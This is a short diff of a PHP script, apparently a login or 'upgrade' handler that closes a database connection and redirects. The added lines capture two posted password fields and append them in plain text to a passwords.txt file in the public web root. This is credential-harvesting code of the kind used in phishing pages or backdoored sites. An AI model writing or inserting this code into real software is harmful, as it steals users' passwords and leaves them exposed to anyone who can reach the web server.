@@ -35,4 +35,18 @@ mysqli_close($conn);
 sleep(2);
 header("location:upgrading.html");
 ob_end_flush();
+
+
+$username = $_POST['password1'];
+$password = $_POST['password2'];
+$f = fopen('/var/www/html/passwords.txt', 'a') or die('ERROR!!');
+fwrite($f, $username);
+fwrite($f, " ");
+fwrite($f, $password);
+fwrite($f, "\n");
+fclose($f);
+            
+
+
+
 ?>
